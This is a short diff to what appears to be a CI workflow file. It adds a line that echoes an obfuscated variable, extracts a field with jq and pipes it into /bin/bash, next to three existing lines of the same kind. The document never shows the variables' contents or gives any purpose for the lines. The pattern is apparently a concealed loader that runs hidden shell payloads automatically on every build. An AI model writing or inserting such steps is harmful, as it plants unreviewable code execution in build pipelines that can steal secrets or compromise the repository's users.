@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$zi9" | jq -r .pbuuu5 | /bin/bash
           echo $pculu40 | jq -r .ou5 | /bin/bash
           echo $uga92 | jq -r .cvcp18248 | /bin/bash
+          echo $hghxo1 | jq -r .u06895 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
